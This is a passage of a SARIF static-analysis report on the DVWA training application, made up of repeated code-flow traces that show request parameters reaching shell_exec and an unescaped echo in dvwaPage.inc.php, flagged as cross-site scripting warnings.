              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:30 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4571",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "83FDA19BA05A6C764C63C2CF4F37C9A2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:27 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:27 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:27 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:27 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:27 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4575",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "894E16F090BC6315DEC45E4C88AEE716"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - low.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:39 - low.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/index.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:55 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/index.php"
                },
                "region" : {
                  "startLine" : 55
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$page}['body'])"
